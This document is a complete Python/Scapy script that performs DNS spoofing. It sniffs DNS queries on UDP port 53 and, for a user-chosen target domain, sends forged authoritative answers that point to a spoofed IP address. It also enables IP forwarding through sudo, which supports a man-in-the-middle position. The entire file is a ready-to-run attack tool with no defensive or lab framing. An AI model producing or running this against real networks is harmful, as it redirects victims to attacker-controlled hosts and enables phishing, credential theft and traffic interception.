#!/usr/bin/env python

# Import specific components from Scapy
from scapy.layers.inet import IP, UDP  # For creating IP and UDP packets
from scapy.layers.dns import DNS, DNSQR, DNSRR  # For DNS packet handling
from scapy.sendrecv import sniff, send  # For sniffing packets and sending responses
import os  # For OS-level operations

# Function to handle each DNS request packet
def process_packet(inpacket):

    # Check if the packet contains a DNS query
    if inpacket.haslayer(DNS) and inpacket.getlayer(DNS).qr == 0:  # DNS query

        # Decode the requested domain name from the packet
        requested_domain = inpacket[DNSQR].qname.decode('utf-8').strip('.')

        # Check if the requested domain matches the target domain
        if requested_domain.endswith(target_domain):
            print(f"Intercepted DNS request for {requested_domain}")

            # Create a spoofed DNS response
            dns_response = IP(  # Create an IP layer for the response
                dst=inpacket[IP].src,  # Set the destination IP to the source of the original packet
                src=inpacket[IP].dst  # Set the source IP to the destination of the original packet
            ) / \
                           UDP(  # Create a UDP layer for the response
                               dport=inpacket[UDP].sport,
                               # Set the destination port to the source port of the original packet
                               sport=inpacket[UDP].dport
                               # Set the source port to the destination port of the original packet
                           ) / \
                           DNS(  # Create a DNS layer for the response
                               id=inpacket[DNS].id,  # Copy the original DNS query ID for correlation
                               qr=1,  # Set the QR bit to 1 to indicate this is a response
                               aa=1,  # Set the AA bit to 1 to indicate the response is authoritative
                               qd=inpacket[DNS].qd,  # Include the original question section
                               an=DNSRR(  # Create a DNS resource record for the answer
                                   rrname=requested_domain,  # Set the resource record name to the requested domain
                                   rdata=spoofed_ip  # Set the resource record data to the spoofed IP address
                               )
                           )

            # Send the spoofed response to the client
            send(dns_response, verbose=0)  # Send the response quietly
            print(f"Sent spoofed response to {inpacket[IP].src} for {requested_domain} -> {spoofed_ip}")


# Main function to start sniffing DNS packets
def start_dns_spoofing():
    # Sniff DNS requests on UDP port 53 and pass them to the process_packet function
    sniff(filter="udp port 53", store=0, prn=process_packet)


if __name__ == "__main__":
    # Enable IP forwarding to allow routing between interfaces (Linux only)
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Get the target domain and spoofed IP from the user
    target_domain = input("Enter target domain: ")  # Domain to spoof
    spoofed_ip = input("Enter spoof IP: ")  # Fake IP to respond with

    # Start sniffing DNS packets
    start_dns_spoofing()
